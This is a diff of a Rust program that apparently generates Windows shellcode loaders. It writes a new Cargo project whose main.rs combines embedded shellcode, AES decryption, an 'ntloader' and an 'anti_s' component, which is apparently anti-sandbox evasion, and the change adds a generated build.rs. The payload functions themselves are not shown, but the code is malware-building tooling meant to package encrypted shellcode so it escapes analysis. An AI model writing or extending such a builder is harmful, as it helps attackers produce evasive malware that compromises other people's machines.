@@ -11,11 +11,10 @@ use winapi::um::cfgmgr32::fMD_CombinedWrite;
 use block_modes::block_padding::Pkcs7;
 use block_modes::{BlockMode, Cbc};
 use std::process::Command;
-use tools::{aesdecryption, main_, main_imports, maincargo, ntloader,anti_s};
+use tools::{aesdecryption, anti_s, build_, main_, main_imports, maincargo, ntloader};
 use xz2::write::XzEncoder;
 
 pub fn setupcargo(project_name: &str) {
-
     // 创建命令
     let output = Command::new("cargo")
         .args(&["new", project_name])
@@ -43,12 +42,18 @@ pub fn setupcargo(project_name: &str) {
 
     let mut main_rs_path = format!("{}/src/main.rs", project_name);
 
-    let combined_code = main_imports() + &shellcode + &aesdecryption() + &ntloader() + &anti_s() + &main_();
+    let combined_code =
+        main_imports() + &shellcode + &aesdecryption() + &ntloader() + &anti_s() + &main_();
 
     let mut main_rs = File::create(main_rs_path).expect("Failed to open main.rs");
     main_rs
         .write_all(combined_code.as_bytes())
         .expect("[!] Failed to write to main.rs");
-}
 
-pub fn test() {}
+    let mut build_code = &build_();
+    let mut build_rs_path = format!("{}/build.rs", project_name);
+    let mut build_rs = File::create(build_rs_path).expect("创建build.rs失败");
+    build_rs
+        .write_all(build_code.as_bytes())
+        .expect("写入build.rs失败")
+}
